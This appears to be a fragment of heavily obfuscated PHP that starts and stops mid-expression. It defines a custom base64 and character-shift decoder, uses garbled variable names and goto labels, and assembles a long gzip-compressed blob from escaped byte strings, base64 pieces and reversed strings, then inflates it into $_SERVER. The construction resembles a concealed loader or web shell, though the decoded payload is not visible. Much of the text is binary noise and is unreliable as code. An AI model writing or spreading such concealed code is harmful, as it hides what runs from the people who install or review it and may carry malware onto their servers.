=> $Ê²ùøâ«, $œªä¡¬»[1362] => $î¬Ğ¨Ûµ, $œªä¡¬»[1363] => $—ç†²„¸, $œªä¡¬»[1364] => $¿·©•º², $œªä¡¬»[1365] => $ô¢‹¬‚Ú, $œªä¡¬»[1366] => $ÍÓÄúÖì, $œªä¡¬»[181] => $this->getHost()); return $¶Òı‰ş¯; } } goto A½‚ÂÕîÇÓ; b×ÂóºğÚ³: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\357\353\363\251\322\332", "\263\346\250\356\375\263"); $_SERVER[ïëó©ÒÚ] = explode("\x7c\x1\x7c\x1\x7c\x3", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\11\234\133\125\365\70\316\46\73\202\240\50\242\370\30\132\146\151\226\231\351\76\355\264\315\314\144\146\322\146\222\41\311\164\233\31".base64_decode('0jfJS/I6yXuZ915maytLgQoFihuCgMpeZKeCiGzyRbSgiKKgoIhAS0EsbojK9rvL')."\xb9\xcb\x7b\x49\xe1\xfb\xff\xfc\x7f\x9f\xcf\xaf\xd0\xe6\xdd\x7d\x3b\xf7\xdc\x73\xce\x3d\xe7\xdc\x37\x6f\xff\xfb\x65\xff\x73\xc5\xc6\xfd\xd1\x7f\x7\xbe\xfb\xec\xd7\x76\xfc\xe8\xcb\xf4\x1b\xfd"."\x3d\x68\xe3\x1\xf4\xfb\xb\x5b\xf\xdd\x8f\xfc\x39\x6e\xeb\x5\xd\xd\xbd\xf3\xe\x9f\x15\x3b\x72\xdb\xf7\x6e\x55\x6f\x51\x6f\x52\x2f\x88\x47\x9f\xf8\x59\xe4\xa8\x27\x6f\x59\x1e\xde\x7d\xed"."\23\123\273\367\337\157\357\257\156\175\251\15\145\246\145\333\350\217\142\230\216\242\115\352\266\143\323\210\214\151\344\364\74\375\326\15\372\33\244\77\3\211\250\245\225\114\107\243"."\xc1\x0\xfd\x49\xf3\x7e\xa1\x7f\xed\xb1\xa2\xce\xd2\xd3\xb1\x78\x2a\x9d\x1c\xe8\xef\xf\x27\x52\x90\xa9\x4d\x4e\x2f\x99\x59\xf8\x2a\xab\x96\x5a\x82\xf6\xcb\x9a\x65\xa3\xde\xc8\xd5\xa5\xcb\x66"."\131\63\134\61\42\42\253\72\352\210\152\103\115\135\35\351\256\160\177\64\276\46\235\132\323\37\206\34\43\351\261\212\146\115\321\20\371\114\72\252\345\244\364\222\306\163\114\130".strrev('n´µş ¤/§¨Dş”êŠçPÑ£ÄOª’/¯¼gthÇ‰3¨d±B%ILHá_¼')."\344\314\6\145\35\115\131\247\64\322\217\156\135\53\146\351\247\241\262\356\70\123\145\370\112\361\57\264\114\106\245\130\244\201\30\377\312\152\71\265\122\204\331\352\222\3\145\113"."\57\251\154\320\53\264\51\36\113\77\324\212\143\352\106\206\6\302\223\216\245\212\170\324\327\14\132\150\315\200\252\222\341\150\270\63\245\340\16\52\335\211\170\237\2\213\120\122"."\155\107\263\224\125\275\341\104\130\301\235\156\257\47\143\255\127\0\136\142\150\52\224\120\64\252\354\253\6\107\53\225\131\65\264\114\215\312\342\211\256\160\102\351\130\243\210\31"."\312\230\245\222\151\4\120\55\150\45\35\251\253\341\104\202\176\370\0\274\243\21\274\150\20\210\167\167\47\303\74\4\203\73\55\212\172\62\33\340\323\25\312\346\212\116\172\134"."\x2d\x56\x18\x98\x8e\xd2\xdf\x7a\xf8\x81\x5f\xd3\x6\xd0\x1d\xd3\xd\xbd\x2\x60\xa\x55\x98\x26\xdf\x56\xf0\x51\x61\xb9\x35\x16\xa3\x65\xe1\xa3\x84\xca\x9b\xb0\xf3\xd0\x36\x1c\xa7\x9f\xed\x4b"."\350\357\42\310\64\222\306\151\232\345\244\65\43\143\146\165\3\66\353\122\0\72\325\51\164\131\72\312\100\303\71\263\230\145\337\266\76\15\103\311\351\105\55\126\51\311\131\170"."\x30\x53\xd0\x8b\x59\x8b\xed\xaf\xf\xcb\x49\x83\x51\xbe\x5d\x71\x5e\x11\x2a\xa3\x9e\x6c\x64\x3b\x5d\xcf\x4d\x89\xfd\x66\x9b\x15\x2b\xa3\x45\xd0\x8e\x10\xe5\xfa\x79\xee\x16\xc8\xa4\x39\xe\x1a"."\x1c\xcc\x8d\x6e\xe\x94\x8b\xa6\x9a\x4d\x6a\x16\x1f\x9a\x6e\x76\xa3\x82\xf1\x8a\x23\x47\x56\x48\xb6\x6e\xd3\x2a\x75\x21\xcc\x0\xed\xa3\x5d\xa1\xf\xd4\x48\x18\x65\xfb\x22\x2b\xcd\x58\xb0\x61"."\360\54\377\373\303\203\313\320\77\215\200\372\206\240\117\5\255\130\114\153\223\32\154\234\122\166\256\315\46\43\150\217\350\106\20\305\320\140\44\236\56\250\166\241\57\73\67\115"."\112\101\227\215\254\66\31\50\27\312\64\50\266\364\220\13\260\361\324\305\114\47\54\341\345\242\231\121\213\362\20\351\167\301\161\312\111\315\310\342\231\200\241\230\23\6\231\251"."\262\246\101\246\56\237\222\125\372\224\65\112\157\233\336\146\263\202\245\42\377\142\243\343\161\66\217\164\46\331\162\146\163\364\143\204\35\13\165\320\240\156\23\14\47\266\247\132"."\x2e\x17\xf5\x8c\xea\xe8\xa6\x11\x34\x33\x8e\xe6\xf8\x6d\xc7\xd2\x54\xa8\x31\x94\xc9\x68\xb6\xed\xef\x34\xd\xc7\x32\x8b\xfe\x50\xb1\x68\x4e\xf8\xe3\x96\x9e\xd7\x8d\x36\xa5\x89\xe6\xc1\x89\x68"."\123\373\61\2\154\203\235\132\267\110\301\200\202\233\151\152\257\70\71\377\2\266\3\171\156\113\65\354\234\146\371\303\260\63\332\24\324\131\216\5\131\266\56\335\56\233\266\216"."\273\327\246\250\216\243\146\12\30\203\210\352\333\77\44\277\156\24\165\103\253\312\33\236\54\353\226\146\263\276\52\75\175\51\250\4\325\256\371\373\55\65\137\122\333\224\162\145".base64_decode('BM0M7NQacTQ3TE2bksFBn1Kq2I7f0hAq0tFxB5Mcyfn78L7Staw/iTA2RM9unqMg').base64_decode('0FFYGo3tTaX605FudCTHwum+UKqzF7rtqHnW5yjCw7xKFrnaj/YXBq4YGquI7Dcn').strrev('Xï#5GD÷yãÚ£”ÈÏÏF¨Oã²î^3,4B$æp’À2sÙšŒ¦Õ1Ü54')."\301\144\70\261\62\234\110\47\343\335\251\125\241\4\34\346\6\202\222\111\326\24\256\272\350\117\150\131\64\365\31\207\225\123\313\170\326\130\36\274\71\360\132\261\124\274\141\130"."\x5a\x34\xd2\x83\x27\xa6\xcb\x6f\xa3\x4c\x7e\x39\x17\xab\x3b\xaa\x97\x74\xdc\x77\x87\xa7\x90\x99\x44\x27\x7d\xf\x74\x28\x48\x6\xd4\x3e\x54\x68\x6a\x18\xca\xce\x6a\xf4\xa3\x7f\x9b\x1a\x7\x87"."\xba\x2\x4d\xc3\x4b\x83\xba\x28\x13\x6c\x9\xb4\x28\xad\xcd\xf3\x94\x7e\x44\x7a\xe8\x6a\x51\x81\x41\x57\xe5\x68\x56\xe2\x2b\xdc\xd3\x22\xa0\xd9\x30\xd\xed\x43\x26\x7\x9f\x5d\xd2\xb6\xf7\x4c"."\53\215\114\204\117\33\10\47\123\351\276\160\252\67\336\5\255\207\103\360\25\65\351\266\145\243\35\244\77\303\260\272\303\364\47\255\333\335\322\261\202\203\34\375\244\315\221\365"."\150\61\372\64\206\143\163\24\107\107\112\152\336\203\362\161\250\317\264\64\167\314\106\176\124\255\322\263\354\114\300\301\136\115\317\27\140\276\164\134\133\306\54\232\226\132\304\230".base64_decode('kW0KjWGrvA7YCpCwCCT1Upl11ilUSiPSJ2B7G8EPw2UFk59npgVfbUHIOLO1GzZj').base64_decode('PJicjf4XqD1rllSGKAmK07IUx9GoJldKr6aKQ9qxHBPHWq4saEILJixsXmNdqvC+')."\261\136\146\265\242\306\146\243\240\261\143\242\31\262\241\143\216\317\125\216\257\31\242\366\120\254\70\237\165\73\201\112\142\244\316\302\253\60\171\54\42\34\236\265\210\116\250\70".base64_decode('WXER7re0nA6b1EAr0qdao2w0aAUErOCABEfdA9FoujMeSyGSmsasSkRSYQa3oa50').base64_decode('qLN/Izt4xYpCBoxg3IAvyOfxVug46k5QHHMIY5dNw9b8GSghSO+qpKw4BWgO6eTw')."\x1c\x6\x93\x7e\xb5\x34\xed\x2f\xa1\x2d\xe0\xe7\x1d\x75\x9f\xc1\xa\x9c\xe\xf4\x28\x8f\xc0\x2a\x9\xe4\x8e\xa7\x11\x71\x45\xec\xf0\xef\x8f\x27\xa1\xc0\x52\x1c\x8b\x8\xb0\x11\xcd\x82\xc6\xfa"."\7\40\251\44\101\110\117\30\42\17\7\240\52\250\55\0\116\253\222\14\61\127\120\176\113\237\126\305\220\226\262\376\260\201\224\212\202\236\163\217\312\57\146\76\325\33\211\255"."\110\367\305\273\302\321\164\44\206\60\123\252\72\176\240\277\53\304\226\122\216\357\210\247\172\135\261\3\10\67\255\14\105\43\336\354\341\325\221\144\52\131\63\11\305\15\204\75"."\x29\x88\x11\xec\x4f\x84\xbb\x23\xab\x79\xb0\x3b\x12\x8e\x76\x25\xd3\x9d\xa1\xce\x5e\x91\x27\x16\xea\x83\x40\x3a\x87\x59\x31\x3b\xe8\xce\x9f\x46\x48\x36\xc9\x19\xba\xf4\x38\x66\x4e\xd9\x64\xa5".base64_decode('XTxUmnEHaQFD6DDVANJguJglJiMBhjhjVtgRwAnJEsMRJRU2kcoOygb606iEkopT').base64_decode('hjoQNhiZ4p9kGCyMSEZoXwGEX9WDNM7ToeU4Hq4dEco5HN17wgj4RRpagRDhvREk')."\220\25\201\146\164\264\225\54\47\304\272\223\23\174\157\72\336\37\116\204\60\327\234\136\225\210\307\172\240\300\104\101\143\35\210\300\364\67\60\342\12\230\147\107\40\44\104\31"."\xa9\x8c\x8b\x12\x93\xbe\xde\x64\x53\xb9\x91\xfe\x9c\x4a\x7f\x10\x51\x8\x8d\x6b\x6\x9b\xf5\x11\x8c\x9b\xd9\xe9\xc2\x3e\x72\x68\x37\x30\xbc\x6a\x56\x78\x6b\x23\xa6\x9\x2d\x14\x31\x7d\xb0\x91"."\x21\xc\xce\x7c\xaf\xb7\x19\x90\x4c\x32\x54\x33\xb\x1a\x9c\x84\xf3\x21\x15\x5f\x11\x8e\xa5\x19\x64\xd1\x90\x4\x8d\x34\x2\xb1\xb3\xf1\x4\x4c\x88\x63\x8e\x32\x9e\x8c\x26\x26\xc2\x49\xb6\xcb".base64_decode('LW2sorPpCgZmARRr6AiC5oOnD03Mahj0zwoMo4/GpmU0CKGhgCs4A8pXLF4ak00N').base64_decode('9tLGtqHgULBhadtgyD+t+qeb/Qv9w7OGAo2zIGJ4Q6tvziacAWVcesow+mkfWjpz').strrev('”PA‹<S‘	u«;5wŠffüBÅL¬¥Æ¦á‰¡”àPòu›o®-×êÈ')."\x25\x4c\xeb\x65\x11\xbb\x61\xde\x26\x16\x8f\xd6\x50\xcb\x8b\x12\x83\xfe\xa1\x59\xc3\x4b\xa5\x72\x52\x94\xb7\x2d\x44\x2e\x21\xfc\x5b\xe0\xf9\x42\xfe\xb5\x78\x64\xbc\x28\xde\xf7\x0\x1f\x15\x23"."\43\260\47\336\27\43\152\6\360\200\236\67\370\26\102\147\72\347\323\335\124\374\206\231\364\167\23\133\310\274\6\233\236\10\342\54\200\316\212\241\217\61\61\204\241\215\301\207"."\xe9\x30\xf8\x1e\xd1\x9c\x9\x8d\x81\x7\x8a\x77\x85\x11\x70\x30\xd6\x11\x25\x49\xa1\x22\x21\xc\xa1\x5\xcc\x50\x71\x18\xe5\xc0\xa4\x97\xd3\x98\xc2\x9a\xe0\xa1\xac\x66\xc0\x3a\x1d\x6\xb9\xed"."\x8c\x5a\xd6\x92\xd2\x8\xd3\xe9\x54\xa8\x23\x1a\x4e\x33\xc\x3\x98\x98\x85\x9\x56\xec\xe0\x22\x3b\x34\x34\x81\x51\x19\x7e\xc8\x8\x12\x9e\x70\x2b\xb0\xf3\xed\xb1\xa2\x42\x10\x83\xa2\x59\x96"."\151\265\21\351\245\135\51\143\322\14\161\146\16\232\133\5\361\364\112\373\22\205\116\71\224\113\313\13\120\126\31\235\200\271\155\115\154\172\214\241\240\117\145\261\102\66\42\250"."\x18\x75\x13\x6c\x18\x1a\xaa\xc\x6a\xd9\xe1\x41\x4\xf8\xaa\x3f\x37\xbc\x61\xf6\xa6\x46\x46\xe5\x7\x87\xd0\x1f\x16\x8\xd5\x90\xa3\xa5\x39\x36\x4c\xa3\xf3\x39\x80\xfb\xc1\x45\x29\xae\x0\x4f"."\246\101\323\342\44\122\331\105\104\73\246\243\26\135\125\244\160\14\54\56\77\270\101\250\100\127\73\52\60\26\76\312\45\1\44\101\247\61\316\304\163\331\210\44\1\303\45\222"."\232\23\340\71\174\122\142\32\205\135\302\340\166\20\20\344\164\3\155\247\116\351\250\243\242\235\344\224\355\150\45\227\324\322\326\124\53\123\350\256\24\213\16\47\345\213\372\50"."\264\0\173\5\204\250\176\372\243\314\252\125\264\333\264\30\107\334\4\335\250\153\252\225\61\142\30\210\177\225\101\115\34\262\75\41\104\316\244\224\6\46\360\123\42\61\245\43".base64_decode('Ho+GQzEFn+dwDiFiIRnuD6FDDPPWyVQYZJCRLj+rd7U/AhwW/9DZ+afmgGOOGN4Y').strrev(''."\0".'s6…À<„°¤‹Hú¢×Ov£³´¹jPˆtÎ‘’„uĞp¢4ö-E6')."\x26\xa\x5a\x66\x34\xad\x8e\xa0\x8d\xc3\xd8\xc5\xa\x96\x6c\x8c\xca\x5d\x0\xf0\x2b\x63\x14\x97\x46\x8b\x96\x46\xac\xd6\x28\x3\x36\x84\xb1\x1d\x36\x16\x10\xe8\x41\x8\x53\xc2\x3e\x2c\xc2\xf2"."\141\122\310\207\46\331\207\371\67\237\140\63\174\102\42\350\33\327\265\11\362\301\271\1\37\60\11\76\107\265\320\260\61\25\17\237\221\56\237\156\167\21\16\207\64\100\222\130".base64_decode('h5wCFtQU1Skf7VxUG9eKPtY1H+uxjzGvPsJxdkG3BtDuh26RT4TkCz4M73i7+YTE').base64_decode('0mdOGJpFssA6CubIJxgnX94yK+V+1qYUot2CCNFnHpEwTcfHmGGfzCdDL0JsW9ec')."\316\332\243\41\363\357\355\4\254\35\116\252\236\245\217\130\254\352\365\160\313\4\66\320\32\101\350\260\211\35\312\256\74\142\171\5\234\213\20\136\0\361\265\122\340\31\74\240"."\x6e\x75\x5c\x86\xbc\x5a\x50\xc8\x0\x9e\xed\x33\x21\x9e\x14\x82\x69\x41\xaa\x7b\x59\x60\xaf\xc8\x1a\x37\x9a\x52\xf3\x49\xa9\x39\x47\xcd\xb3\xb6\x30\xae\x45\xa9\xfb\xcc\x4a\xbf\x13\x5a\x66\x2a".base64_decode('I3jqLolTd4fcm6uC6kuqOc8gfWSX1dohtSGAQz1fsMMPO4zNONsKfPVdO+ij9y6M')."\222\340\363\170\131\120\104\264\263\370\114\111\42\104\323\135\144\123\324\52\47\303\151\342\163\207\360\326\13\220\323\205\334\373\44\271\360\45\32\356\116\51\313\343\10\25\353\146"."\232\226\111\343\314\12\371\307\64\24\127\335\154\272\224\166\222\56\302\252\221\245\61\353\320\261\265\256\275\216\65\122\347\52\56\200\306\335\11\37\13\272\132\23\353\57\117\2"."\x6\xe\x32\x7c\x71\xd4\xb2\xa8\xb8\x38\xd9\x2b\x40\xc6\xaa\x36\x30\x94\x58\x8e\xf\x5f\x1a\x8b\x13\x4b\x2b\x43\xa9\x84\x8c\x44\x4\xeb\x97\xab\x5d\x1c\x14\x3b\x8c\x81\x84\x82\x1b\x80\xa\x8"."\xe1\x85\x11\x8e\x5f\xec\x15\x29\xe8\x9e\x72\xf\x44\x7a\xe8\x1\x3c\x45\xfd\xba\x31\xa5\x1b\xb2\xc8\x4d\xc4\x6e\xe4\x24\x85\xa0\x68\xf0\x56\xf7\x8\x9\xbb\xf6\xf5\x4d\x8f\x18\x21\xd2\xf3\x81"."\xa8\xcf\x87\x8f\x31\x89\xda\x10\xf2\x26\xd4\x7b\x72\x96\x96\x5c\xc2\xc9\xea\x9e\x33\xa4\xb\x83\x1e\x48\x86\x13\x69\xd6\x36\xec\x6e\x80\xf8\x82\x6a\x89\xc9\x64\x38\x9\x23\x6\x21\xc8\xc4\x59".base64_decode('RFDKllPHBbXlKiNhFtuZYr2XP92V0mDXvgK9XFJTKyjjKd2OchLA/U1GmjJrBrE0').base64_decode('kH1TYoFfeqJFaGBIBailtCTz4EjJjfFol0L8AEDHKjoU6TdiToroLLQCeA/14BON')."\315\31\105\177\62\114\46\65\264\141\240\234\250\55\131\225\46\347\26\362\56\174\70\210\303\204\315\265\330\202\142\376\305\176\163\201\112\136\364\16\343\360\164\165\247\60\270\327".base64_decode('DndbJifrOZHgzdRJ+GZ+3eo52KXJcREjVVFSGS9Z4on1BMWquE4lGsVk5Gq2pBsB').strrev('oL¦‡ÅA¹	°I‹-BÀVØ±LwEMÊÎS“`ÚRÜ¢Y¯¹Á'."\r".'Ä}‹')."\360\132\154\224\40\241\166\67\131\305\112\46\313\52\333\26\300\100\125\170\63\234\6\244\101\103\317\214\212\255\254\216\43\202\233\341\137\62\30\321\123\32\216\162\62\32\143\232"."\160\126\167\160\14\76\110\115\46\320\27\31\245\153\163\36\47\43\170\162\116\125\55\276\140\232\174\63\135\71\335\224\6\104\66\21\2\40\40\10\43\131\153\40\143\226\1\16"."\x24\x25\x99\x92\x39\xae\x49\x91\x1\xdb\x31\xcb\x22\x45\xa\xd2\x64\x29\x49\x54\x2a\xe5\xe2\x4b\x43\xfa\x81\xb6\x58\x96\x10\xd5\x62\xa2\x48\x5e\x28\x4b\x4\x8\x74\x17\x7\x30\x47\x12\x10\x73"."\31\351\12\131\26\3\133\72\70\174\23\205\42\345\50\214\1\223\154\317\325\72\322\150\345\341\161\241\2\103\253\302\15\7\50\6\10\250\331\154\234\335\306\311\337\325\131\145".strrev('h^bnlŞHFqÅkc;Ü&ë}˜ä…Ë³t"Ï¼7ƒ…*ÎÕ'."\n".'J¯>ˆŠíja')."\170\211\176\67\336\336\67\201\303\66\247\227\173\341\13\132\73\214\150\202\316\202\156\150\66\77\332\55\273\26\316\372\177\114\111\127\257\1\336\53\373\2\34\234\46\11\340\261"."\122\336\270\353\34\347\122\146\201\262\44\122\205\34\373\151\307\105\144\45\110\35\322\346\161\301\3\332\254\164\314\370\130\212\304\321\146\254\15\241\336\174\32\223\263\23\74\67"."\xc9\x8f\x56\xb9\x10\x4e\xc2\xeb\xb5\xaf\x4a\x79\x3a\xaf\x4c\x10\x74\x72\x3e\x4\x99\x38\x61\x5f\xd5\xb0\x64\x5e\xcb\xd7\x9f\xdd\xf3\xf5\xab\x76\xd2\xef\x2b\x1e\xdf\x76\xe6\x59\x17\x1\xc2\x2a".strrev('×iòt½—}Í¦ö<ßiĞ¥ùÏÿošë9êŸ\'ñ<Êz»[h[ôÁïô àŞì£Ssf')."\74\232\151\334\331\363\362\217\337\330\353\373\301\356\67\236\264\306\127\316\30\370\40\363\275\276\53\227\46\256\333\176\304\257\303\133\237\51\234\165\174\41\163\110\341\222\357\34"._kodDe('K9LpasXsQtBWOIHMMkuOakxm29lGMv7yrtDgUmLNby7u8YKu6eEiac+U4+Eayer+fg==')."\316\331\377\347\47\76\365\330\101\177\77\341\202\307\256\35\121\177\367\333\325\373\207\237\334\377\301\77\36\321\276\344\137\247\55\50\267\146\346\376\370\203\361\304\1\213\76\263".base64_decode('7dEbHj3hSOVPXbvvXXzHTVfud/KPu4z6+QvfuPtQp+Xcw87vvPu6VW+e9MzdD37x')."\267\243\326\143\237\377\311\216\27\347\274\171\364\173\213\316\376\333\35\227\314\332\374\173\175\346\333\57\276\72\361\317\267\277\61\343\212\63\376\365\374\334\45\117\375\367\335\301"."\x9b\x4e\xdd\x9c\x7b\xe7\xcc\x6d\xdf\x1f\xfc\xcb\xad\xcb\x57\xc4\x77\x3c\xb2\xdf\x57\xde\x3d\xff\xc0\xfa\xa9\x37\x92\x87\x6c\x8\x3d\xd6\x74\xc3\x81\x2d\xf\x3f\xde\xd6\xf0\x99\x95\xcb\x4f\x52"."\167\237\350\237\323\367\231\203\256\54\305\342\207\314\133\375\375\113\103\127\137\371\257\365\337\72\143\155\154\331\211\37\137\276\370\225\43\377\372\330\163\155\15\147\267\276\170\345"."\332\103\316\72\141\306\357\377\62\125\370\370\337\156\373\355\164\161\135\142\350\334\321\131\117\35\163\327\163\276\357\74\125\372\311\177\255\330\61\366\307\317\74\342\151\347\250\203"."\x6f\xb8\xe3\xc0\x8e\x9b\xdb\xce\xd9\xbd\xfd\x2\xff\xc9\x23\x7\x3f\xba\xf7\x98\xf1\x2f\x9c\xfa\xa9\xc3\x37\x2b\x97\xad\x1b\x79\xab\x63\x46\xd7\xd0\x9e\x73\x37\x66\x17\xcd\xf8\x4e\xdf\xd8\x6f"."\xf\x52\x5e\xd9\xbc\x7f\x51\x3d\xf7\x98\x9d\x23\xf5\x17\x37\xfc\xeb\xe9\xdf\x16\xbf\x79\xc2\x5d\x4d\xed\x8f\xed\xfc\xfc\xeb\x75\xb1\xe3\x16\xac\x8b\xbd\x94\xd9\x73\xc0\x21\x6f\xe5\x1f\x7c\xea"."\xc0\xd5\xb7\xbd\xfc\xd6\x96\xfe\xb5\xf3\xd7\xfd\xf4\x6f\x1b\x3e\xf3\xf4\xa3\xeb\x96\x2b\xc5\x77\xfa\xef\xcb\x1c\x7a\xe8\x1b\x2f\x6f\x5a\x1d\x3a\x34\xfe\xdf\x62\xe0\xee\x3b\x8e\x3e\xb8\x65\x70"."\155\337\226\105\27\153\73\257\77\351\312\317\335\65\313\130\227\335\371\304\261\267\134\360\146\375\137\143\277\63\366\77\374\304\313\356\135\326\140\376\351\374\55\315\167\234\264\340"."\213\237\132\370\324\17\37\67\26\336\166\312\17\16\72\162\375\310\356\246\55\73\117\327\156\130\371\217\321\275\41\73\167\315\367\376\243\217\177\52\264\354\272\301\277\236\163\365".base64_decode('Mfd8zvzarjcGb278RfgfjZ9u/FaiZ6ztgNl3On9467U3+p4v9uzUT9q+8y3rpH80')."\174\353\306\267\77\265\337\201\237\73\366\270\365\117\315\270\344\364\135\205\113\272\347\73\225\153\166\145\217\276\355\310\317\34\77\124\251\267\177\326\325\166\360\362\256\225\133\76"."\176\327\356\376\267\117\175\160\367\201\307\335\140\344\56\376\335\331\365\307\314\74\363\351\63\217\172\171\347\175\207\34\171\102\351\324\177\25\363\312\47\67\177\255\355\205\145\307".base64_decode('qcXNx2ip3Zkv39m64oDL/3zVZ67ZtPgr23tXf+ulH5/12Jax2M03OA8fGX8g1f/k')."\xd3\xca\x7d\xcf\x3d\x79\xcc\x86\xbf\xfe\xfc\x9f\x87\x1e\x71\xc8\x59\xb\xe2\x37\xcc\x39\xdf\x2e\x5c\xf9\xc7\xaf\x67\x93\xd7\xbd\x79\xeb\x5\xcf\xdc\xf2\xfa\x55\xcb\xcf\xa8\x2f\xdd\x76\xce\x9"."\xaf\x5e\xb5\xec\xd8\xe6\x1f\xfe\xf9\x85\xc8\x79\xb1\xfd\x6\x76\xfe\x75\x62\x59\xf3\xfd\x8f\xf4\xbe\xf8\xc8\xaf\x77\x6f\xbe\xfa\x2b\x7\x5e\x7a\xfd\xd9\xc3\xb7\xfc\xf2\xe9\x8f\x7d\xf5\xd6\xf6"."\xb1\xe8\x6f\x27\x52\xf7\xed\x3a\xf2\xaa\xd6\x8b\x63\x1f\xbb\xf0\x2a\xe5\x80\xad\x4f\x6d\xbf\xe7\x8f\x8b\x9f\x9a\x75\xeb\xca\x77\x56\x9b\xf7\x2c\x7c\xf3\xde\x7\xaf\x7f\xfb\xb9\xbf\xbc\xbf\xf1"."\363\35\17\237\70\224\274\242\253\365\343\327\77\376\304\371\103\207\157\370\304\316\67\216\253\254\74\341\263\167\126\342\332\317\372\373\272\326\276\75\366\314\357\57\234\71\264\354"."\345\356\13\316\71\350\332\261\247\167\234\373\323\340\71\247\234\263\305\322\33\377\262\154\170\307\131\67\36\373\306\155\133\37\270\377\374\367\116\30\155\74\157\316\266\313\276\363".base64_decode('6UcXnard/IP7rx6K3b6m0PjarKTvmobm2wf3vHzYjMEdo7ktvz33tPAPc8+d+8k3')."\x7e\xb4\xe6\xa0\xc7\x5f\x5c\xd4\xf5\x95\x3\x2a\xda\x73\xef\xec\xbd\xe9\xb9\xb7\x72\xe1\xf9\x3f\x69\xbe\x72\x6f\xcf\xbd\xff\xf8\x55\x4b\x78\xdd\xe3\xda\x77\x77\xef\xf8\xe5\x51\xbd\x87\x9e\x6a".base64_decode('nv+bq0/Z/Ou3j9NO+OVLg4enfK+u+vXPPrHl0Bvffm7ue9tfeDq1NPydo87veib2').base64_decode('0B9/ueGt7gdWvXnYUec9/I9sU/Gkwqbjj5uu3GiV+83rW04588aOz6rHfWdT83Lr').base64_decode('icGHH9yw496Rus8dftylJ/3hhR3Lfj69+HM//ur1xx6rGSeftiH5xk9+/vLw7g7n')."\311\123\315\145\153\177\31\72\342\107\275\77\365\337\361\372\307\347\45\333\234\73\176\166\306\312\57\177\76\345\373\335\367\15\373\277\173\373\236\156\272\355\153\53\77\375\351\113"."\15\377\357\227\37\173\340\214\271\367\154\171\375\123\217\356\171\167\376\57\236\374\340\335\47\236\130\165\306\103\33\337\373\347\113\267\307\37\232\172\377\245\277\277\365\347\211\140".base64_decode('+oypf/09nf/C/Qs++Kf56WB6+N2/rbKtl1446e8X/fGDm0J73/X9ZX77D3554fkn')."\x34\x9c\xaf\xfc\x62\xc3\x25\xad\xfb\x6d\x7b\xfd\x13\xca\x5d\x7f\x32\xbb\x1f\xb8\xe6\x96\x55\x77\x65\xb6\x36\x7d\xe3\xcc\xa3\x42\xcf\xde\xf7\xcb\x65\xf\x7f\x2e\xbc\x26\x7f\xf2\xb\xd7\x5d\xfa".base64_decode('b3Ov80z3US1jMfWGLx+/I/Jcoqnxk0fEjr+64/DrL//9zC1b7rp3+ys3rKs8e9dP')."\x8e\xb6\xdf\xf4\xf9\xda\xd7\xde\xf7\xc0\xf6\x6f\x1c\x51\xf7\xa3\xe3\x57\xcc\xda\x76\xfc\xa5\xc7\xbf\x3d\x7e\xe2\xda\x5b\x8b\x83\xdb\x76\x9c\xdb\x7d\xf4\xef\x97\x7d\xe1\xf1\xfd\x5e\xb9\x63\xe7"."\x2f\x56\x3d\x34\xe3\xfe\xc6\xc7\x1a\xb6\x3f\x76\xcf\xd6\x47\xd6\xd\xfb\xff\x7d\xe7\xed\xce\x97\x17\xdb\x8f\x5c\x30\x14\x7b\xe6\x94\x67\x3e\xd8\x7d\xd4\xee\x67\xfb\x53\x33\xaf\x6e\x38\xe0\xb4"."\xfa\x47\x56\x9e\x7a\xfd\x97\x9e\x78\xec\x2f\x3d\xdf\xfa\xcd\x9d\xf3\xff\xb8\xe8\x86\xb5\x7b\xde\xb9\xec\xa9\x5b\x86\x9b\xf7\x3f\xe0\x8f\x8f\x9d\x7b\xdb\x8f\x7e\xb5\xf5\xb9\xfa\xd8\xbc\x47\x5e"."\164\36\332\173\120\337\374\337\31\77\170\370\213\17\276\372\342\346\346\347\56\77\342\265\221\141\375\201\165\117\256\337\373\357\75\55\227\7\76\375\275\225\205\150\324\272\75\161"."\xc6\x53\xcd\xe3\x4f\x2c\x5c\xd0\xde\xfe\xcc\x23\xc6\xdd\x8b\xfc\xc6\xdd\x13\xf1\x67\x57\xdc\xd6\xf2\xc2\x9e\xef\x3f\xf7\x1b\xe3\xda\x65\x9f\xdd\x73\xc7\xb2\x6d\x6f\xfa\x5f\xfd\xfd\xdf\xb2\x6d"."\173\113\317\276\163\137\332\374\365\61\77\273\350\331\303\137\330\373\344\353\343\277\270\341\201\300\322\374\313\273\177\365\122\307\17\236\71\106\373\166\342\117\251\113\357\330\162\127"."\x5e\x5d\x34\xe3\xee\x6d\xf\x24\x17\xfe\xe8\xb9\x53\x1e\xff\xef\xa3\x43\xbf\x5e\xff\xee\x2b\x7\xaf\x68\x7a\xe3\x9a\x65\xa9\xcb\xdf\x5c\x7c\x70\xbd\xd2\x7c\xfe\xcb\xc9\x35\xd7\xb6\xcf\xfe\xe6".base64_decode('6o09qe47h/85/qWTIj23fHfFO+eu3XzmAYlbD71l5Oif31G6ObVAvf3Iu47+0peW')."\x5f\x31\xf7\x2f\xb7\xf4\x9c\xfc\xef\x83\xbe\xd4\x3f\xe7\x11\xe7\xcd\x4d\x67\xde\xb4\xf6\xf5\x83\x37\x97\xee\x99\x3e\xe0\xba\x33\x4f\xcc\xee\x59\x30\xb2\xed\xab\xcb\xcf\xf3\xbd\xb8\x2a\x71\xf2"."\302\263\236\374\365\337\232\256\276\360\213\133\357\276\274\361\360\53\76\273\101\275\354\354\71\57\327\307\377\271\362\23\133\337\373\316\125\255\233\257\370\365\277\56\71\345\300\135"."\xc3\x7f\xba\xac\xe1\x8b\xdf\x9b\x1e\xbc\x61\xed\x33\xc5\xb9\xef\x7d\xe6\xf9\x9f\x9f\x75\xe3\xb\x2f\xaf\x4a\x3f\x58\x6e\x7a\xfe\xa4\x5\x6f\x7d\xe2\xb8\x4f\x5e\xa5\x2d\x79\x7c\xe5\xf1\x5d\x97".strrev('Ä'."\n".'Ï\'u¦şr(ïc¢ÿØo¦çËBùß„÷—sïÊîû\\‡ÓÿP